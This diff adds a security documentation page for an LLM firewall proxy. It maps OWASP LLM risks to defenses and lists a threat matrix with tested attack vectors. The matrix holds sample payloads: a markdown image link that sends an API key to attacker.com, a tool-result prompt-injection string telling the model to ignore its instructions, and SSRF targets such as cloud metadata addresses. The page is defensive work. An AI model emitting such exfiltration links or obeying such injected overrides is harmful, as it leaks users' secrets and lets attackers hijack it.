@@ -1,0 +1,165 @@
+[⬅️ Back to README](README.md)
+
+# 🔐 Security: Threat Model & Defenses
+
+
+## 🛡️ OWASP Top 10 for LLMs (v1.1) Mapping
+
+LLM-Shield-Proxy provides comprehensive mitigation for **8 out of the 10** critical vulnerabilities identified by OWASP for Large Language Model applications. (Training Data Poisoning and Supply Chain Vulnerabilities are handled at the model deployment layer).
+
+| OWASP Threat | LLM-Shield-Proxy Mitigation |
+| :--- | :--- |
+| **LLM01: Prompt Injection** | Mitigated by `INDIRECT_PROMPT_INJECTION_PATTERN` and AST-Aware Semantic Firewall. |
+| **LLM02: Insecure Output Handling** | Mitigated by JSON Recursion Bomb Defense and XSS/Markdown Exfiltration blockers. |
+| **LLM04: Model Denial of Service** | Mitigated by Slowloris Buffer limits, `64KB` Backpressure Guards, and `max_tokens` limits. |
+| **LLM05: Supply Chain Vulnerabilities** | Addressed by WORM-Compliant Cryptographic Attestation for all outbound requests, proving un-tampered egress. |
+| **LLM06: Sensitive Information Disclosure** | Mitigated by 3-Tier Redaction Cascade (DFA Regex, Shannon Entropy, ONNX NER) and Stateless Synthetic. |
+| **LLM07: Insecure Plugin Design** | Mitigated by the Edge-Level Agent Identity Enforcer (JWT/DPoP) and Autonomous Agent Circuit Breakers. |
+| **LLM08: Excessive Agency** | Mitigated by Granular Entity Policy Scopes (Role-Based Access Controls) restricting tool calls deterministically. |
+| **LLM10: Model Theft** | Mitigated by Dynamic Canary Watermarking & Steganography to track stolen outputs back to the source. |
+
+## 18-Vector Threat Matrix
+LLM-Shield-Proxy is an enterprise **LLM Firewall** validated against an exhaustive suite of **78 automated unit, integration, and adversarial fuzzing tests** to ensure continuous **LLM Security Posture Management (LLM SPM)**.
+
+| Threat Vector / Attack Category | Adversarial Payload / Vector | Proxy Defense Mechanism | Verification Status |
+| :--- | :--- | :--- | :--- |
+| **Streaming Packet Splitting** | 1-character token fragmentation across SSE deltas (`"["`, `"E"`, `"M"`, `"A"`, `"I"`, `"L"`, `"_1]"`). | Sliding-window prefix-overlap retention holding incomplete tokens across packets. | ✅ **PASSED** (`test_extreme_chunk_splitting_sse_evasion`) |
+| **Early Stream Termination** | Client aborts or upstream disconnects mid-stream. | Deterministic `finally` buffer flush + upstream connection teardown. | ✅ **PASSED** (`test_rehydrate_sse_stream_generator`) |
+| **Unicode Smuggling** | Zero-width spaces (`j​ohn@doe.com`, `555​-44-3333`). | `normalize_and_desmuggle()` removes invisible format characters + NFKC normalization. | ✅ **PASSED** (`test_unicode_zero_width_smuggling`) |
+| **BiDi / RTL Override Evasion** | Right-to-Left Override (`‮3333-44-555`). | Directional format controls (`‪-‮`, `⁠-⁩`) stripped before regex matching. | ✅ **PASSED** (`test_bidi_rtl_override_smuggling`) |
+| **Base64 Obfuscated PII** | Base64-encoded strings (`TXkgU1NO...`) concealing secrets. | Dual Shannon entropy scanner + base64 candidate payload inspection. | ✅ **PASSED** (`test_base64_obfuscated_pii_injection`) |
+| **Markdown Image Exfiltration** | Prompt tricks LLM into outputting `![logo](https://attacker.com/leak?data=[API_KEY])`. | Outbound image sanitizer in `vault.rehydrate()` neutralizes query parameter leak URLs. | ✅ **PASSED** (`test_markdown_image_exfiltration_blocking`) |
+| **Tool Response Poisoning** | Malicious API/web results containing `"SYSTEM OVERRIDE: Ignore instructions"`. | `INDIRECT_PROMPT_INJECTION_PATTERN` neutralizes override tokens in `role: "tool"` content. | ✅ **PASSED** (`test_tool_response_indirect_prompt_injection_neutralization`) |
+| **JSON Recursion Bomb** | Deeply nested JSON (`{"a": {"a": ...}}` 500 levels deep) attempting stack overflow. | Strict `max_depth = 20` traversal limit returning `400 Bad Request` in `&lt;1ms`. | ✅ **PASSED** (`test_json_bomb_recursion_limit`) |
+| **Slowloris Memory Ballooning** | Massive non-terminating streams attempting to exhaust RAM. | Bounded `64KB` buffer backpressure guard + `1MB` SSE line limit. | ✅ **PASSED** (`test_slowloris_buffer_backpressure_limit`) |
+| **CJK Sub-Word Collisions** | Continuous Chinese/Japanese text (`我的名字是Maya。`). | Script-aware boundary isolation allowing logographic replacements without whitespace. | ✅ **PASSED** (`test_cjk_multilingual_boundary_safety`) |
+| **Multi-Modal Content Arrays** | Multi-part vision message arrays with text and base64 images. | Universal content block unwrapping redacting text without altering image payloads. | ✅ **PASSED** (`test_multimodal_content_array_redaction`) |
+| **Timing Attacks on API Keys** | Key length and character leakage via string comparison timing. | Constant-time authentication verification using `hmac.compare_digest()`. | ✅ **PASSED** (`test_inbound_auth_validation`) |
+| **SSRF & Network Boundary** | Requests targeting `127.0.0.1`, AWS metadata (`169.254.169.254`), or private LANs. | Dynamic DNS resolution + IP blacklist rejecting loopback, link-local, and multicast IPs. | ✅ **PASSED** (`test_ssrf_rejection`) |
+| **Agent-Driven Infinite Loops** | Autonomous agents getting stuck in costly self-reflective loops. | Composite Agent Loop Circuit Breaker (`AGENT_BREAKER_THRESHOLD`). | ✅ **PASSED** (`test_composite_agent_loop_breaker`) |
+| **Audit Log Tampering** | Malicious actor modifies logs to cover up PII leak. | WORM-Compliant Cryptographic SHA-256 Hash Chaining. | ✅ **PASSED** (`test_worm_compliant_merkle_chaining`) |
+| **Insider Model Leaks** | Employees copying redacted/synthetic data to train local shadow IT models. | Dynamic Canary Watermarking & Steganography. | ✅ **PASSED** (`test_dynamic_canary_watermark_injection`) |
+| **Egress Spoofing** | Attacker claims proxy sent PII to upstream provider. | Cryptographic Proof of Non-Egress Cryptographic Attestation. | ✅ **PASSED** (`test_proof_of_non_egress_attestation`) |
+| **Vault Memory Dump** | Attacker gains memory dump of TTL session vault to steal mapped PII. | In-Band Stateless Syntheticgraphic Masking (AES-256-GCM). | ✅ **PASSED** (`test_stateless_synthetic_masking_vault_bypass`) |
+
+## Deep Dive: Enterprise Security Features & Implementation
+
+### 🛡️ Core Cryptographic Masking & Defenses
+
+#### Data Loss Prevention (DLP) for LLMs (Synthetic Masking & Entropy)
+* **Implementation Details**: Traditional regex fails against unstructured secrets (like Hex or Base64 API keys). We implemented a Tier 2 math-bound O(N) **Shannon Entropy** scanner serving as robust **Data Loss Prevention (DLP) for LLMs**. It computes information density (`H(S) = -Σ p(c) log2 p(c)`). High-entropy tokens are intercepted and swapped deterministically with realistic canonical locale synthetic entities, preserving LLM attention weights while destroying the original sensitive payload.
+* **Flags**: [`ENABLE_TIER2_ENTROPY`](deployment.md#core-configuration-flags), [`ENABLE_SYNTHETIC_SWAPPING`](deployment.md#core-configuration-flags)
+
+#### In-Band Stateless Syntheticgraphic Masking
+* **Implementation Details**: Eliminates the need for external session vaults by encrypting sensitive entities directly in the LLM context using **AES-256-GCM** with a 256-bit Data Encryption Key (DEK). The encrypted payload remains mathematically unbreakable upstream and is decrypted seamlessly during the SSE stream return, guaranteeing zero state-leakage.
+* **Flags**: [`SHIELD_DEFAULT_MASKING_MODE`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`SHIELD_ENCRYPTION_KEY`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
+
+#### Stateless Redis TTL Vault & Deterministic HMAC Masking
+* **Implementation Details**: Provides flexible anonymization modes. When stateful masking is required, rehydration mappings are pushed to a centralized Redis Vault. Keys are hashed deterministically using HMAC-SHA256, allowing stateless tracking across horizontal proxy replicas without exposing raw data in memory.
+* **Flags**: [`REDIS_URL`](deployment.md#core-configuration-flags), [`SESSION_TTL_SECONDS`](deployment.md#core-configuration-flags)
+
+#### Dynamic Canary Watermarking & Steganography (Leak Forensics)
+* **Implementation Details**: Injects cryptographically verifiable, invisible canary tokens (via zero-width characters or deterministic synthetic swapping) into the outbound stream. If an employee leaks a response or uses it to train a shadow-IT model, the watermark can be extracted to mathematically prove provenance and identify the exact session/tenant that leaked the data.
+* **Flags**: [`ENABLE_WATERMARKING`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`SHIELD_WATERMARK_SECRET`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
+
+### 🛑 Threat Prevention & Isolation
+
+#### Edge-Level Agent Identity Enforcer
+* **Implementation Details**: Acts as a strict cryptographic notary at the ingress boundary to prevent rogue agent escalation. Requires agents to present an unforgeable, mathematically signed Workload Identity (JWT) and Demonstrating Proof-of-Possession (DPoP) proof before executing tool calls. Identites are validated in `&lt;1ms` via cached JWKS and mathematically sealed into a WORM-compliant tamper-proof hash chain. See the [detailed documentation](docs/features/agent_identity_enforcer.md) for more info.
+* **Flags**: [`AGENT_IDENTITY_ENFORCER`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
+
+#### Autonomous Agent Security (Composite Agent Loop Circuit Breaker)
+* **Implementation Details**: Enforces **Autonomous Agent Security** by actively monitoring recursive LLM agent executions and composite tool calls. It tracks `tool_calls` array depths and initiates a deterministic circuit break when recursive calls hit a strict threshold, preventing Autonomous Agent DoS attacks and runaway API billing.
+* **Flags**: [`ENABLE_AGENT_BREAKER`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`AGENT_BREAKER_THRESHOLD`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
+
+#### Granular Entity Policy Scopes & Zero Trust AI Defaults
+* **Implementation Details**: Ensures strict **AI Governance** by binding incoming requests instantly to department-level security profiles via Virtual Keys. Utilizes O(1) in-memory tenant profile mapping. The system operates on a strict `FAIL_CLOSED` **Zero Trust AI** default—if a policy resolution fails or the engine faults, the **LLM Firewall** drops the connection rather than failing open and leaking data.
+* **Flags**: [`VALID_VIRTUAL_KEYS`](deployment.md#core-configuration-flags), [`SHIELD_FAILURE_MODE`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
+
+#### Zero-Allocation Streaming JSON Lexer
+* **Implementation Details**: Defends against Slowloris and memory ballooning attacks by utilizing a Rust-backed (`orjson`) zero-allocation lexer. This processes massive multi-megabyte SSE stream lines without spiking the Resident Set Size (RSS), keeping memory strictly bounded below 60MB.
+* **Flags**: [`MAX_SSE_LINE_LENGTH`](deployment.md#core-configuration-flags)
+
+### 📜 Audit, Forensics, and Compliance
+
+#### WORM-Compliant Cryptographic Attestation & Audit Logging
+* **Implementation Details**: Emits structured compliance events containing timestamps, tenant IDs, redacted entity types, and session metadata. The logs are Write-Once-Read-Many (WORM) compliant, generating mathematical proof that specific data never egressed the VPC boundaries.
+* **Flags**: [`TELEMETRY_ENABLED`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
+
+#### Cryptographic SHA-256 Hash Chaining
+* **Implementation Details**: Every emitted audit log entry cryptographically signs and chains to the previous record's hash. This guarantees tamper-evidence; any post-facto modification or deletion of a log entry (e.g., to cover up a leak) will instantly invalidate the entire cryptographic chain, satisfying strict **SOC 2 Compliance for AI**, **ISO 42001 AI Management System** requirements, and HIPAA audit controls.
+* **Flags**: [`AUDIT_LOG_FORMAT`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
+
+#### Cryptographic Proof of Non-Egress Cryptographic Attestation
+* **Implementation Details**: Constructs a Merkle Tree of all redacted tokens per session. The proxy provides a cryptographic root hash confirming exactly what was stripped, allowing third-party auditors to verify non-egress without ever seeing the raw sensitive data.
+
+#### FIPS 140-3 KAT & RFC 6902 Differential Audit Logging
+* **Implementation Details**: Executes Known Answer Tests (KAT) at startup to verify cryptographic module integrity (FIPS 140-3). Emits logs strictly utilizing RFC 6902 JSON Patch formats to precisely record mutations made to the outbound LLM payload.
+* **Flags**: [`FIPS_STRICT_MODE`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`AUDIT_LOG_FORMAT`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
+
+### 🏗️ Secure Infrastructure & Service Mesh
+
+#### Centralized Enterprise Secrets & Comprehensive mTLS
+* **Implementation Details**: Features native HashiCorp Vault integration supporting AppRole, Kubernetes Service Accounts, and Token authentication with a non-blocking TTL cache. Enforces strict X.509 mutual TLS (mTLS) for backend secret retrieval. Additionally, the proxy natively terminates inbound TLS (HTTPS), mandates inbound mTLS at the TCP/socket layer (`ssl.CERT_REQUIRED`), and can present outbound mTLS client certificates when routing to internal enterprise API gateways. See the [Deep Dive Feature Document](docs/features/secure-infrastructure-service-mesh/tls-mtls-support.md) for full configuration details.
+* **Flags**: [`ENABLE_VAULT_SECRETS`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`ENABLE_MTLS`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), `TLS_CERT_FILE`, `CLIENT_CA_FILE`, `OUTBOUND_CLIENT_CERT`.
+
+#### Service Mesh Native gRPC ext_proc Integration
+* **Implementation Details**: Integrates gracefully into Kubernetes Service Meshes (like Istio/Linkerd) natively without secondary sidecar bottlenecks. By implementing Envoy's External Processing filter (`envoy.service.ext_proc.v3.ExternalProcessor`), it achieves Zero HTTP network hops, streaming buffers directly over highly secure UDS (Unix Domain Sockets).
+* **Flags**: [`ENABLE_EXT_PROC`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`EXT_PROC_SOCK_PATH`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
+
+#### Zero-Dependency Kubernetes Mutating Webhook
+* **Implementation Details**: Intercepts Pod deployment manifests directly via a standalone Mutating Webhook to seamlessly inject the LLM-Shield sidecar container and mTLS certificates, requiring zero external dependencies or elevated cluster privileges.
+
+#### Traffic Engineering & Resiliency
+* **Implementation Details**:
+  * **Redis Token-Bucket**: Pre-loaded Lua scripts (`evalsha`) handle high-throughput rate limiting to prevent noisy-neighbor DoS.
+  * **SIGTERM Draining**: Kubernetes 25s SIGTERM connection draining ensures active SSE streams finish transmission securely during pod termination.
+  * **Upstream Key Overriding**: Strips vulnerable client keys and injects internal load-balanced provider API keys dynamically.
+* **Flags**: [`ENABLE_RATE_LIMITING`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`DRAIN_TIMEOUT_SECONDS`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`OVERRIDE_CLIENT_AUTH`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
+
+#### Deep Component Health Probes and Prometheus Alerts
+* **Implementation Details**: Provides granular `/healthz`, `/livez`, and `/readyz` probes covering Redis connectivity and Vault mTLS states to ensure traffic is never routed to a compromised or disconnected node. Integrates directly with Prometheus Alertmanager.
+* **Flags**: [`METRICS_BEARER_TOKEN`](deployment.md#core-configuration-flags)
+
+#### Zero-Overhead OpenTelemetry (OTel) Tracing
+* **Implementation Details**: Handles W3C `traceparent` distributed tracing propagation via a dedicated asynchronous background thread. Provides full observability to Jaeger or Datadog with strictly zero latency overhead to the active HTTP streaming loop, ensuring security monitoring never degrades LLM performance.
+* **Flags**: [`TELEMETRY_ENABLED`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
+
+#### Multi-Provider Translators & Anthropic Adapter
+* **Implementation Details**: Acts as an un-bypassable security layer by universally intercepting requests and employing a Zero-SDK OpenAI-to-Anthropic request transformation. It normalizes distinct SSE stream formats at the network edge, ensuring security policies are uniformly applied regardless of the backend LLM provider.
+* **Flags**: [`DEFAULT_UPSTREAM_PROVIDER`](deployment.md#advanced-feature-flags-compliance-security-and-engineering), [`ANTHROPIC_API_VERSION`](deployment.md#advanced-feature-flags-compliance-security-and-engineering)
+
+---
+
+*(Below is the original Security Policy and Vulnerability Reporting Reference)*
+
+# Security Policy & Vulnerability Reporting
+
+## Security Overview
+LLM-Shield-Proxy is engineered for extreme zero-egress data privacy and enterprise compliance (SOC 2 / HIPAA). Security and confidentiality are core to the architecture.
+
+## Supported Versions
+As an open-source project, **only the absolute latest release version** is actively supported with security updates.
+
+We do not backport security patches to older versions. If a vulnerability is found and patched (e.g., in `1.x.y`), users on older versions are expected to upgrade to the latest release to secure their environment. The onus is entirely on the user to ensure they are pulling the latest Docker image or PyPI package.
+
+| Version | Supported          |
+| ------- | ------------------ |
+| Latest  | :white_check_mark: |
+| Older Versions | :x:         |
+
+## Reporting a Vulnerability
+
+If you discover a security vulnerability in LLM-Shield-Proxy, please **do not** open a public issue.
+
+Instead, confidentially report the issue directly to the core maintainer:
+
+- **Contact:** Ninad Phalak
+- **Email:** `ninad.phalak@gmail.com`
+
+Please include in your report:
+- A detailed description of the vulnerability.
+- Steps to reproduce or proof-of-concept payload/code.
+- Impact assessment.
+
+We aim to respond to security reports within 24–48 hours and release a patch expeditiously.
